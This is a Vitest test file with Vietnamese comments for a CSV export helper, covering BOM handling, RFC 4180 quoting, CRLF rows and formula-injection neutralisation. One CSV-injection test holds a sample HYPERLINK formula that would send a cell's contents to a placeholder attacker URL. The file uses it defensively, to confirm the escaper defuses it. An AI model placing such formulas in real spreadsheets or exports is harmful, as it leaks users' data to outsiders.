import { describe, expect, it } from "vitest";
import { escapeCsvCell, toCsv, UTF8_BOM } from "./csv";

/**
 * Bộ phân tích CSV tối giản theo RFC 4180, CHỈ dùng trong test.
 *
 * Có nó để kiểm được TÍNH CHẤT "ô thoát ra rồi đọc lại vẫn là ô cũ" thay vì chỉ ghim từng chuỗi
 * mong đợi. Ghim chuỗi bắt được lỗi ở ca đã nghĩ ra; khứ hồi bắt được cả những ca chưa nghĩ tới
 * (ví dụ nháy kép nằm giữa ô, hay dấu phẩy ngay sát nháy kép).
 *
 * Cố ý KHÔNG xuất ra `lib/core/csv.ts`: repo không cần đọc CSV, và một bộ phân tích không ai dùng
 * là mã chết mang theo bề mặt lỗi riêng của nó.
 */
function parseCsv(text: string): string[][] {
  const body = text.startsWith(UTF8_BOM) ? text.slice(UTF8_BOM.length) : text;
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let quoted = false;
  let index = 0;

  while (index < body.length) {
    const char = body[index] ?? "";

    if (quoted) {
      if (char === '"') {
        // Nháy kép nhân đôi bên trong ô = một nháy kép dữ liệu.
        if (body[index + 1] === '"') {
          cell += '"';
          index += 2;
          continue;
        }
        quoted = false;
        index += 1;
        continue;
      }
      cell += char;
      index += 1;
      continue;
    }

    if (char === '"' && cell === "") {
      quoted = true;
      index += 1;
      continue;
    }
    if (char === ",") {
      row.push(cell);
      cell = "";
      index += 1;
      continue;
    }
    if (char === "\r" && body[index + 1] === "\n") {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = "";
      index += 2;
      continue;
    }

    cell += char;
    index += 1;
  }

  row.push(cell);
  rows.push(row);
  return rows;
}

describe("UTF8_BOM", () => {
  /**
   * ⚠ Khoá lại BẪY 1. Hằng số này phải là ĐÚNG ký tự U+FEFF — không phải chuỗi bốn ký tự
   * `\`, `u`, `F`… mà ai đó vô tình thoát hai lần, cũng không phải chuỗi rỗng sau một lần "dọn ký
   * tự lạ". Cả hai sai lầm đó đều làm tệp mất BOM mà không có gì báo, vì BOM vốn đã vô hình.
   */
  it("là đúng một ký tự U+FEFF, không phải chuỗi escape bị thoát hai lần", () => {
    expect(UTF8_BOM).toHaveLength(1);
    expect(UTF8_BOM.codePointAt(0)).toBe(0xfeff);
  });

  /** Đối chứng cho `pnpm core:check`: hằng số này CÓ ký tự ngoài ASCII, nên nó phải viết bằng escape. */
  it("nằm ngoài ASCII — đó là lý do trong mã nguồn nó phải là escape sequence", () => {
    expect(UTF8_BOM.charCodeAt(0)).toBeGreaterThan(0x7f);
  });
});

describe("escapeCsvCell — bọc theo RFC 4180", () => {
  it("ô thường thì để nguyên, không bọc thừa", () => {
    expect(escapeCsvCell("Sửa lỗi đăng nhập")).toBe("Sửa lỗi đăng nhập");
    expect(escapeCsvCell("")).toBe("");
    expect(escapeCsvCell("CV-104")).toBe("CV-104");
  });

  it("ô chứa dấu phẩy thì phải bọc", () => {
    expect(escapeCsvCell("Hà Nội, Việt Nam")).toBe('"Hà Nội, Việt Nam"');
  });

  it("nháy kép bên trong được nhân đôi và cả ô bị bọc", () => {
    expect(escapeCsvCell('Ông ấy nói "xong rồi"')).toBe('"Ông ấy nói ""xong rồi"""');
    expect(escapeCsvCell('"')).toBe('""""');
  });

  it("ô chứa xuống dòng thì phải bọc — cả \\n trần lẫn \\r\\n", () => {
    expect(escapeCsvCell("dòng 1\ndòng 2")).toBe('"dòng 1\ndòng 2"');
    expect(escapeCsvCell("dòng 1\r\ndòng 2")).toBe('"dòng 1\r\ndòng 2"');
  });

  /**
   * Khoảng trắng đầu/cuối không bắt buộc bọc theo RFC, nhưng nhiều bộ phân tích tự cắt nó đi —
   * bọc lại là cách duy nhất nói rằng khoảng trắng đó là DỮ LIỆU chứ không phải căn lề.
   */
  it("bọc ô bắt đầu hoặc kết thúc bằng khoảng trắng", () => {
    expect(escapeCsvCell(" đầu")).toBe('" đầu"');
    expect(escapeCsvCell("cuối ")).toBe('"cuối "');
    expect(escapeCsvCell(" ")).toBe('" "');
    expect(escapeCsvCell("\tcó tab ở đầu")).toBe('"\tcó tab ở đầu"');
  });

  it("khoảng trắng Ở GIỮA không phải lý do để bọc", () => {
    expect(escapeCsvCell("hai từ")).toBe("hai từ");
  });

  /** ⚠ Khoá lại cảnh báo "không idempotent": thoát hai lần là ra một ô KHÁC, hợp lệ và sai. */
  it("KHÔNG idempotent — thoát hai lần cho ra nội dung khác", () => {
    const once = escapeCsvCell("a,b");
    expect(once).toBe('"a,b"');
    expect(escapeCsvCell(once)).toBe('"""a,b"""');
    expect(parseCsv(escapeCsvCell(once))[0]?.[0]).toBe('"a,b"');
  });

  /**
   * ⚠ Test này canh cho lần REFACTOR sau, không cho mã hôm nay. Bản hiện tại quyết định bằng một
   * hàm không trạng thái nên nó xanh hiển nhiên; nhưng ai đó gọn hoá nó thành một regex có cờ `g`
   * thì `RegExp.test` bắt đầu nhớ `lastIndex` giữa các lần gọi, và kết quả phụ thuộc ô ĐỨNG TRƯỚC.
   * Một test gọi hàm đúng một lần sẽ không bao giờ thấy; gọi nhiều lần liên tiếp là cách duy nhất.
   */
  it("kết quả không phụ thuộc lần gọi trước đó", () => {
    const inputs = ["a,b", "bình thường", 'có "nháy"', "x"];
    const first = inputs.map(escapeCsvCell);
    const second = inputs.map(escapeCsvCell);
    const third = inputs.map(escapeCsvCell);
    expect(second).toEqual(first);
    expect(third).toEqual(first);
    expect(escapeCsvCell("x")).toBe("x");
  });
});

describe("escapeCsvCell — chống CSV injection", () => {
  /**
   * ⚠ Cái bẫy NGUY HIỂM nhất của file này: dữ liệu người dùng nhập trở thành mã chạy trên máy
   * NGƯỜI KHÁC. Cả bốn ký tự mở đầu phải được vô hiệu hoá, không sót cái nào.
   */
  it("vô hiệu hoá cả bốn ký tự mở đầu công thức", () => {
    expect(escapeCsvCell("=1+1")).toBe("'=1+1");
    expect(escapeCsvCell("+1")).toBe("'+1");
    expect(escapeCsvCell("-1")).toBe("'-1");
    expect(escapeCsvCell("@SUM(A1)")).toBe("'@SUM(A1)");
  });

  it("chỉ ký tự ĐẦU TIÊN mới kích hoạt — dấu = ở giữa là dữ liệu bình thường", () => {
    expect(escapeCsvCell("a=b")).toBe("a=b");
    expect(escapeCsvCell("2+2=4")).toBe("2+2=4");
  });

  /** Công thức có dấu phẩy phải nhận CẢ HAI lớp: nháy đơn chống công thức, nháy kép tách ô. */
  it("công thức chứa dấu phẩy nhận cả nháy đơn lẫn bọc nháy kép", () => {
    const attack = '=HYPERLINK("https://ke-tan-cong/?d="&A1,"Bao cao")';
    const escaped = escapeCsvCell(attack);
    expect(escaped.startsWith("\"'=")).toBe(true);
    // Đọc lại thì nội dung nguyên vẹn, chỉ thêm đúng một nháy đơn ở đầu.
    expect(parseCsv(escaped)[0]?.[0]).toBe(`'${attack}`);
  });

  /**
   * ⚠ Khoá lại đánh đổi đã ghi trong JSDoc: số âm cũng bắt đầu bằng `-` nên nó thành VĂN BẢN.
   * Test này tồn tại để lần sau ai thấy `'-5` mà tưởng là lỗi thì đọc được LÝ DO trước khi "sửa".
   */
  it("số âm cũng bị chèn nháy đơn — cái giá cố ý của việc chặn công thức", () => {
    expect(escapeCsvCell("-5")).toBe("'-5");
    expect(escapeCsvCell("-1.5")).toBe("'-1.5");
    expect(escapeCsvCell("5")).toBe("5");
  });

  /** ⚠ Nháy đơn nằm trong BYTE của tệp: hàm này dựng tệp cho NGƯỜI đọc, không khứ hồi được. */
  it("không khứ hồi: máy đọc lại nhận thêm nháy đơn", () => {
    expect(parseCsv(toCsv([["=1+1"]]))).toEqual([["'=1+1"]]);
  });
});

describe("toCsv", () => {
  /** ⚠ BẪY 1 — thiếu BOM là mọi dấu tiếng Việt vỡ trên máy người dùng Windows. */
  it("luôn mở đầu bằng BOM", () => {
    expect(toCsv([["a"]]).startsWith(UTF8_BOM)).toBe(true);
    expect(toCsv([["Công việc", "Người phụ trách"]]).startsWith(UTF8_BOM)).toBe(true);
  });

  it("mảng rỗng cho ra ĐÚNG một BOM, không dòng nào", () => {
    expect(toCsv([])).toBe(UTF8_BOM);
    expect(toCsv([])).toHaveLength(1);
  });

  /** ⚠ BẪY 3 — CRLF, và không có `\n` nào đứng một mình. */
  it("ngăn dòng bằng CRLF", () => {
    expect(toCsv([["a"], ["b"], ["c"]])).toBe(`${UTF8_BOM}a\r\nb\r\nc`);
  });

  it("không có \\n trần nào ngoài phần thuộc CRLF", () => {
    const csv = toCsv([
      ["Công việc", "Ghi chú"],
      ["CV-1", "dòng 1\ndòng 2"]
    ]);
    // Bỏ hết CRLF đi thì `\n` còn lại chỉ có thể là `\n` NẰM TRONG một ô đã bọc nháy kép.
    const withoutRowBreaks = csv.replaceAll("\r\n", "");
    expect(withoutRowBreaks.split("\n")).toHaveLength(2);
    expect(parseCsv(csv)[1]?.[1]).toBe("dòng 1\ndòng 2");
  });

  it("không có CRLF thừa ở cuối tệp — dòng trống cuối thành một bản ghi ma", () => {
    const csv = toCsv([["a"], ["b"]]);
    expect(csv.endsWith("\r\n")).toBe(false);
    expect(parseCsv(csv)).toHaveLength(2);
  });

  it("ghép các ô trong một dòng bằng dấu phẩy", () => {
    expect(toCsv([["a", "b", "c"]])).toBe(`${UTF8_BOM}a,b,c`);
  });

  it("ô rỗng vẫn giữ đúng số cột", () => {
    expect(toCsv([["a", "", "c"]])).toBe(`${UTF8_BOM}a,,c`);
    expect(parseCsv(toCsv([["a", "", "c"]]))).toEqual([["a", "", "c"]]);
  });

  /**
   * TÍNH CHẤT tổng: mọi ô KHÔNG bắt đầu bằng ký tự công thức đều khứ hồi nguyên vẹn — kể cả khi
   * chứa dấu phẩy, nháy kép, xuống dòng và khoảng trắng ở biên cùng lúc.
   */
  it("khứ hồi: mọi ô không phải công thức đọc lại đúng như lúc đưa vào", () => {
    const rows = [
      ["Mã", "Tiêu đề", "Ghi chú"],
      ["CV-1", "Hà Nội, Việt Nam", ' có "nháy" và khoảng trắng '],
      ["CV-2", "dòng 1\r\ndòng 2", ""],
      ["CV-3", "a=b", "2+2=4"]
    ];
    expect(parseCsv(toCsv(rows))).toEqual(rows);
  });

  it("giữ nguyên dấu tiếng Việt — BOM là thứ duy nhất được thêm vào đầu", () => {
    const csv = toCsv([["Đã hoàn thành", "Ưu tiên khẩn"]]);
    expect(csv.slice(UTF8_BOM.length)).toBe("Đã hoàn thành,Ưu tiên khẩn");
  });

  it("nhận readonly array — nơi gọi truyền thẳng dữ liệu bất biến, không phải sao chép", () => {
    const rows: readonly (readonly string[])[] = [["a", "b"]] as const;
    expect(toCsv(rows)).toBe(`${UTF8_BOM}a,b`);
  });
});
